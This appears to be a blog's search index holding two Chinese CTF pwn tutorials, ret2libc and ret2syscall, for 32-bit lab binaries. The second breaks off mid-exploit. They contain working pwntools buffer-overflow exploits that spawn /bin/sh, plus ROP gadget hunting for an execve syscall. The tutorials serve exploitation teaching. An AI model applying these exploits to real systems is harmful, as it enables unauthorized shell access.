<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>ret2libc</title>
      <link href="/2022/12/03/7-ret2libc/"/>
      <url>/2022/12/03/7-ret2libc/</url>
      
        <content type="html"><![CDATA[<h2 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h2><p>ret2libc 即控制函数的执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)。一般情况下，我们会选择执行 system(“/bin/sh”)，故而此时我们需要知道 system 函数的地址。</p><p>当程序的NX enable开启，写入shellcode没有执行权限，又或者程序开有ASLR保护（随机地址），每次执行程序想利用的函数地址都是变化的时，我们就可以考虑用libc里的函数动态得到system函数地址与/bin/sh字符串地址</p><h3 id="step1-32bit-or-64bit"><a href="#step1-32bit-or-64bit" class="headerlink" title="step1 32bit or 64bit?"></a>step1 32bit or 64bit?</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ret2libc1$ file ret2libc1</span><br><span class="line">ret2libc1: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, <span class="keyword">for</span> GNU/Linux 2.6.24, BuildID[sha1]=fb89c86b266de4ff294489da59959a62f7aa1e61, with debug_info, not stripped</span><br></pre></td></tr></table></figure><h3 id="step2-checksec"><a href="#step2-checksec" class="headerlink" title="step2 checksec"></a>step2 checksec</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ret2libc1$ checksec ret2libc1</span><br><span class="line">[*] <span class="string">&#x27;/home/pwn/桌面/(5)retlibc/ret2libc1/ret2libc1&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><h3 id="step3-IDA32"><a href="#step3-IDA32" class="headerlink" title="step3 IDA32"></a>step3 IDA32</h3><p>存在栈溢出危险函数gets( )</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">100</span>]; <span class="comment">// [esp+1Ch] [ebp-64h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;RET2LIBC &gt;_&lt;&quot;</span>);</span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>法一：在函数窗口发现_system函数，点击+空格</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.plt:08048460 _system         proc near               ; CODE XREF: secure+44↓p</span><br><span class="line">.plt:08048460</span><br><span class="line">.plt:08048460 command         = dword ptr  4</span><br><span class="line">.plt:08048460</span><br><span class="line">.plt:08048460                 jmp     ds:off_804A018</span><br><span class="line">.plt:08048460 _system         endp</span><br></pre></td></tr></table></figure><p>法二：使用以下命令查找地址，使用命令前应进行如下步骤：gdb ret2libc1 —&gt; b main —&gt; r —&gt; objdump -d ret2libc1</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">objdump -d ret2libc1</span><br><span class="line"></span><br><span class="line">命令介绍：</span><br><span class="line">objdump -d &lt;.elf&gt;</span><br><span class="line">反汇编<span class="built_in">test</span>中的需要执行指令的那些section</span><br><span class="line"></span><br><span class="line">objdump -D &lt;.elf&gt;</span><br><span class="line">与-d类似，但反汇编<span class="built_in">test</span>中的所有section</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">08048450 &lt;puts@plt&gt;:</span><br><span class="line"> 8048450:ff 25 14 a0 04 08    jmp    *0x804a014</span><br><span class="line"> 8048456:68 10 00 00 00       push   $0x10</span><br><span class="line"> 804845b:e9 c0 ff ff ff       jmp    8048420 &lt;.plt&gt;</span><br><span class="line"></span><br><span class="line">08048460 &lt;system@plt&gt;:</span><br><span class="line"> 8048460:ff 25 18 a0 04 08    jmp    *0x804a018</span><br><span class="line"> 8048466:68 18 00 00 00       push   $0x18</span><br><span class="line"> 804846b:e9 b0 ff ff ff       jmp    8048420 &lt;.plt&gt;</span><br></pre></td></tr></table></figure><p><strong>sys_addr = 08048460</strong></p><p>法一：shfit+F12</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">LOAD:0804815400000013C/lib/ld-linux.so.2</span><br><span class="line">LOAD:080482B90000000AClibc.so.6</span><br><span class="line">LOAD:080482C30000000FC_IO_stdin_used</span><br><span class="line">LOAD:080482D700000006Csrand</span><br><span class="line">LOAD:080482DD0000000FC__isoc99_scanf</span><br><span class="line">LOAD:080482F600000006Cstdin</span><br><span class="line">LOAD:080482FC00000007Cstdout</span><br><span class="line">LOAD:0804830300000007Csystem</span><br><span class="line">LOAD:0804830A00000008Csetvbuf</span><br><span class="line">LOAD:0804831200000012C__libc_start_main</span><br><span class="line">LOAD:080483240000000FC__gmon_start__</span><br><span class="line">LOAD:080483330000000ACGLIBC_2.7</span><br><span class="line">LOAD:0804833D0000000ACGLIBC_2.0</span><br><span class="line">.rodata:0804872000000008C/bin/sh</span><br><span class="line">.rodata:0804872B00000008Cshell!?</span><br><span class="line">.rodata:080487330000000DCRET2LIBC &gt;_&lt;</span><br><span class="line">.eh_frame:080487AB00000005C;*2$\&quot;</span><br></pre></td></tr></table></figure><p>法二：使用以下命令查找地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search &#x27;/bin/sh&#x27;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; search <span class="string">&#x27;/bin/sh&#x27;</span></span><br><span class="line">ret2libc1       0x8048720 das     /* <span class="string">&#x27;/bin/sh&#x27;</span> */</span><br><span class="line">ret2libc1       0x8049720 <span class="string">&#x27;/bin/sh&#x27;</span></span><br><span class="line">libc-2.31.so    0xf7f5d352 <span class="string">&#x27;/bin/sh&#x27;</span></span><br></pre></td></tr></table></figure><p><strong>bin_sh = 08048720</strong></p><h3 id="step4-exp"><a href="#step4-exp" class="headerlink" title="step4 exp"></a>step4 exp</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">                             +-----------------+</span><br><span class="line">                             |    <span class="string">&#x27;/bin/sh&#x27;</span>    |</span><br><span class="line">                             +-----------------|                 </span><br><span class="line">                             |     b<span class="string">&#x27;bbbb&#x27;</span>     |</span><br><span class="line">                             +-----------------|                 </span><br><span class="line">                             |   system@plt    | ret_addr</span><br><span class="line">                             +-----------------+</span><br><span class="line">                             |       ebp       |</span><br><span class="line">                      ebp---&gt;+-----------------+</span><br><span class="line">                             |                 |</span><br><span class="line">                             |                 |</span><br><span class="line">                             |                 |</span><br><span class="line">                             |                 |</span><br><span class="line">                             +-----------------+                 </span><br><span class="line">                             |        s        | <span class="built_in">local</span> var</span><br><span class="line">              s起始,ebp-108--&gt;+-----------------+  </span><br><span class="line"><span class="comment"># 为什么要填充&#x27;bbbb&#x27;，为了栈平衡。local var 后接 ebp 再后接 ret_addr</span></span><br><span class="line"><span class="comment">#########################################################################################</span></span><br><span class="line"></span><br><span class="line">                             +-----------------+</span><br><span class="line">                             |    <span class="string">&#x27;/bin/sh&#x27;</span>    | system要传入的参数<span class="string">&#x27;/bin/sh&#x27;</span>            </span><br><span class="line">                             +-----------------|                 </span><br><span class="line">                   ret_addr  |       ebp       | system中的汇编指令push ebp</span><br><span class="line">                             +-----------------+</span><br><span class="line">                             |   system@plt    | ret_addr</span><br><span class="line">                             +-----------------+</span><br><span class="line">                             |       ebp       | 含父函数ebp信息的ebp</span><br><span class="line">                      ebp---&gt;+-----------------+</span><br><span class="line">                             |                 |</span><br><span class="line">                             |                 |</span><br><span class="line">                             |                 |</span><br><span class="line">                             +-----------------+                 </span><br><span class="line">                             |        s        | <span class="built_in">local</span> var</span><br><span class="line">              s起始,ebp-108--&gt;+-----------------+ </span><br><span class="line"><span class="comment"># 返回到system地址后调用system，system中有汇编指令push ebp，可以看到push ebp 产生了又一个ebp压入栈中，在这里没什么用可以用垃圾数据padding，故&#x27;/bin/sh&#x27; 移到sys_aadr的上面两个字长</span></span><br><span class="line"><span class="comment">#########################################################################################</span></span><br><span class="line"></span><br><span class="line">                             +-----------------+</span><br><span class="line">                             |    <span class="string">&#x27;/bin/sh&#x27;</span>    | system要传入的参数<span class="string">&#x27;/bin/sh&#x27;</span>        </span><br><span class="line">                             +-----------------+</span><br><span class="line">                             |   system@plt    | ret_addr</span><br><span class="line">                             +-----------------+</span><br><span class="line">                             |       ebp       | 含父函数ebp信息的ebp</span><br><span class="line">                      ebp---&gt;+-----------------+</span><br><span class="line">                             |                 |</span><br><span class="line">                             |                 |</span><br><span class="line">                             |                 |</span><br><span class="line">                             +-----------------+                 </span><br><span class="line">                             |        s        | <span class="built_in">local</span> var</span><br><span class="line">              s起始,ebp-108--&gt;+-----------------+ </span><br><span class="line"><span class="comment">#　若直接在system后面紧跟参数&#x27;/bin/sh&#x27;，则push ebp时产生的ebp会将参数&#x27;/bin/sh&#x27;的地址覆盖掉，故为了栈平衡，我们要将参数&#x27;/bin/sh&#x27;的地址上移两个字长  </span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#exp1</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&#x27;./ret2libc1&#x27;</span>)</span><br><span class="line">binsh_addr = <span class="number">0x8048720</span></span><br><span class="line">system_plt = <span class="number">0x08048460</span></span><br><span class="line">payload = flat([<span class="string">&#x27;a&#x27;</span> * <span class="number">112</span>, system_plt, <span class="string">&#x27;b&#x27;</span> * <span class="number">4</span>, binsh_addr])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#exp2</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./ret2libc1&#x27;</span>)</span><br><span class="line">bin_sh = <span class="number">0x08048720</span></span><br><span class="line">sys_addr = <span class="number">0x08048460</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">112</span>+p32(sys_addr)+<span class="string">b&#x27;B&#x27;</span>*<span class="number">4</span>+p32(bin_sh)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># exp3终极版</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&quot;./ret2libc1&quot;</span>)</span><br><span class="line"><span class="comment"># 替代ida进行静态分析</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./ret2libc1&quot;</span>)</span><br><span class="line"><span class="comment"># 查看system函数的plt地址，输出十进制地址，可以加hex()转换成十六进制</span></span><br><span class="line">sys_addr = elf.plt[<span class="string">&quot;system&quot;</span>]</span><br><span class="line"><span class="comment"># 查看&#x27;/bin/sh&#x27;字符串地址(前面要加b)，输出十进制地址，可以加hex()转换成十六进制</span></span><br><span class="line">bin_sh = <span class="built_in">next</span>(search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line"><span class="comment"># p32()将地址打包成二进制，不管是十六进制还是十进制</span></span><br><span class="line">payload = flat([<span class="string">b&#x27;a&#x27;</span>*<span class="number">112</span>, p32(sys_addr), <span class="string">b&#x27;bbbb&#x27;</span>, p32(bin_sh)])</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="可能遇到的问题"><a href="#可能遇到的问题" class="headerlink" title="可能遇到的问题"></a>可能遇到的问题</h3><p><strong>Q1: 为什么见到有些payload是没有为system函数传像’a’*4这样的函数返回地址参数呢？</strong></p><p>A：因为直接调用 call _system 时，根据call命令的功能，它会先把返回地址压入栈，再跳转到指定函数（即plt的位置），而直接调用plt处的函数是没有压入返回地址参数这一步骤的，故可认为’b’ * 4填充的为虚拟地址。</p><p><strong>Q2: exp.py报错？</strong></p><p>A：在填充字符前加b，如exp2</p>]]></content>
      
      
      <categories>
          
          <category> 玩转PWN </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ret2syscall</title>
      <link href="/2022/12/03/6-ret2syscall/"/>
      <url>/2022/12/03/6-ret2syscall/</url>
      
        <content type="html"><![CDATA[<h2 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h2><p>ret2syscall，即控制程序执行系统调用，获取 shell</p><h3 id="step1-32bit-or-64bit"><a href="#step1-32bit-or-64bit" class="headerlink" title="step1 32bit or 64bit?"></a>step1 32bit or 64bit?</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwn3文件$ file rop</span><br><span class="line">rop: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, <span class="keyword">for</span> GNU/Linux 2.6.24, BuildID[sha1]=2bff0285c2706a147e7b150493950de98f182b78, with debug_info, not stripped</span><br></pre></td></tr></table></figure><h3 id="step2-checksec"><a href="#step2-checksec" class="headerlink" title="step2 checksec"></a>step2 checksec</h3><p>源程序为 32 位，开启了 NX 保护</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwn3文件$ checksec rop</span><br><span class="line">[*] <span class="string">&#x27;/home/pwn/桌面/pwn3文件/rop&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><h3 id="step3-IDA32"><a href="#step3-IDA32" class="headerlink" title="step3 IDA32"></a>step3 IDA32</h3><p>直接F5反汇编，伪代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [esp+1Ch] [ebp-64h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;This time, no system() and NO SHELLCODE!!!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What do you plan to do?&quot;</span>);</span><br><span class="line">  gets(&amp;v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="step4-系统调用"><a href="#step4-系统调用" class="headerlink" title="step4 系统调用"></a>step4 系统调用</h3><p>由于开启了NX，我们不能直接利用程序中的某一段代码或者自己填写代码来获得 shell，所以我们利用程序中的 gadgets（小片段）组合成ROP（返回导向编程） 来获得 shell，而对应的 shell 获取则是利用系统调用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">关于系统调用的知识：</span><br><span class="line">Linux 的32位系统调用通过 int 80h （int 0x80）实现，用系统调用号来区分入口函数</span><br><span class="line"></span><br><span class="line">应用程序调用系统调用的过程是：</span><br><span class="line">1、把系统调用的编号存入 EAX</span><br><span class="line">2、把函数参数存入其它通用寄存器</span><br><span class="line">3、触发 0x80 号中断（int 0x80）</span><br></pre></td></tr></table></figure><p>比如说，我们利用如下系统调用来获取 shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execve(<span class="string">&quot;/bin/sh&quot;</span>,NULL,NULL)</span><br></pre></td></tr></table></figure><p>那么我们要做的就是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.eax=0xb</span><br><span class="line">2.ebx=/bin/sh 的地址</span><br><span class="line">  ecx=0</span><br><span class="line">  edx=0</span><br><span class="line">3.触发int 0x80</span><br></pre></td></tr></table></figure><h4 id="1-查看系统调用号"><a href="#1-查看系统调用号" class="headerlink" title="1.查看系统调用号"></a>1.查看系统调用号</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">command</span>(命令)：<span class="built_in">cat</span> /usr/include/asm/unistd_32.h | grep execve</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwn3文件$ <span class="built_in">cat</span> /usr/include/asm/unistd_32.h | grep execve</span><br><span class="line"><span class="comment">#define __NR_execve 11</span></span><br><span class="line"><span class="comment">#define __NR_execveat 358</span></span><br></pre></td></tr></table></figure><p>可以知道系统调用号为 11，转换为 16 进制是 0xb，所以 eax 中应该存放 <strong>0xb</strong></p><h4 id="2-寄存器传参"><a href="#2-寄存器传参" class="headerlink" title="2.寄存器传参"></a>2.寄存器传参</h4><p>查找寄存器eax</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">command：ROPgadget --binary rop  --only &#x27;pop|ret&#x27; | grep &#x27;eax&#x27;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwn3文件$ ROPgadget --binary rop  --only <span class="string">&#x27;pop|ret&#x27;</span> | grep <span class="string">&#x27;eax&#x27;</span></span><br><span class="line">0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x080bb196 : pop eax ; ret</span><br><span class="line">0x0807217a : pop eax ; ret 0x80e</span><br><span class="line">0x0804f704 : pop eax ; ret 3</span><br><span class="line">0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br></pre></td></tr></table></figure><p><strong>pop_eax_ret = 0x080bb196</strong></p><p>同样用此命令查找其他寄存器：EBX ECX EDX，即将EAX换成上述寄存器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary rop  --only &#x27;pop|ret&#x27; | grep &#x27;ebx&#x27;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">pwn3文件$ ROPgadget --binary rop  --only <span class="string">&#x27;pop|ret&#x27;</span> | grep <span class="string">&#x27;ebx&#x27;</span></span><br><span class="line">0x0809dde2 : pop ds ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0805b6ed : pop ebp ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0809e1d4 : pop ebx ; pop ebp ; pop esi ; pop edi ; ret</span><br><span class="line">0x080be23f : pop ebx ; pop edi ; ret</span><br><span class="line">0x0806eb69 : pop ebx ; pop edx ; ret</span><br><span class="line">0x08092258 : pop ebx ; pop esi ; pop ebp ; ret</span><br><span class="line">0x0804838b : pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x080a9a42 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x10</span><br><span class="line">0x08096a26 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x14</span><br><span class="line">0x08070d73 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc</span><br><span class="line">0x08048547 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 4</span><br><span class="line">0x08049bfd : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 8</span><br><span class="line">0x08048913 : pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x08049a19 : pop ebx ; pop esi ; pop edi ; ret 4</span><br><span class="line">0x08049a94 : pop ebx ; pop esi ; ret</span><br><span class="line">0x080481c9 : pop ebx ; ret</span><br><span class="line">0x080d7d3c : pop ebx ; ret 0x6f9</span><br><span class="line">0x08099c87 : pop ebx ; ret 8</span><br><span class="line">0x0806eb91 : pop ecx ; pop ebx ; ret</span><br><span class="line">0x0806336b : pop edi ; pop esi ; pop ebx ; ret</span><br><span class="line">0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret//<span class="comment">#########定位#########</span></span><br><span class="line">0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0806eb68 : pop esi ; pop ebx ; pop edx ; ret</span><br><span class="line">0x0805c820 : pop esi ; pop ebx ; ret</span><br><span class="line">0x08050256 : pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x0807b6ed : pop ss ; pop ebx ; ret</span><br></pre></td></tr></table></figure><p>由于其中一段地址可以控制3个寄存器，故直接使用该地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</span><br></pre></td></tr></table></figure><p><strong>pop_edx_ecx_ebx_ret = 0x0806eb90</strong></p><h4 id="3-int-0x80"><a href="#3-int-0x80" class="headerlink" title="3.int 0x80"></a>3.int 0x80</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">commmand：ROPgadget --binary rop  --only <span class="string">&#x27;int&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwn3文件$ ROPgadget --binary rop  --only <span class="string">&#x27;int&#x27;</span></span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x08049421 : int 0x80</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 1</span><br></pre></td></tr></table></figure><p><strong>int_0x80 = 0x08049421</strong></p><h4 id="4-bin-sh"><a href="#4-bin-sh" class="headerlink" title="4./bin/sh"></a>4./bin/sh</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">command</span>：ROPgadget --binary rop  --string <span class="string">&#x27;/bin/sh&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwn3文件$ ROPgadget --binary rop  --string <span class="string">&#x27;/bin/sh&#x27;</span></span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line">0x080be408 : /bin/sh</span><br></pre></td></tr></table></figure><p><strong>binsh = 0x80be408</strong>，是 ‘/bin/sh’ ，不是 ‘bin/sh’，错误示范如下，导致返回地址错误</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ROP$ ROPgadget --binary ret2syscall --string <span class="string">&#x27;bin/sh&#x27;</span></span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line">0x080be409 : bin/sh</span><br></pre></td></tr></table></figure><h3 id="step5-exp"><a href="#step5-exp" class="headerlink" title="step5 exp"></a>step5 exp</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 